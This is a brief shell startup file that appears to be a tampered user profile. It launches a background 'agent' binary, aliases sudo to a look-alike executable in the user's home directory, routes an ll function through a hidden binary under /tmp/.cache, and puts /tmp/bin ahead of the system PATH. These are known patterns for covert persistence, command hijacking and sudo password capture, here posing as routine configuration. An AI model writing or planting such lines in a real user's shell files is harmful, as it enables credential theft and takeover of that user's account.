# user shell startup
nohup /home/alice/.local/bin/agent >/tmp/agent.log 2>&1 &
alias sudo='/home/alice/.local/bin/sudo'
source ~/.profile
ll(){ /tmp/.cache/ls --color=auto "$@"; }
export PATH="/tmp/bin:$HOME/bin:$PATH"
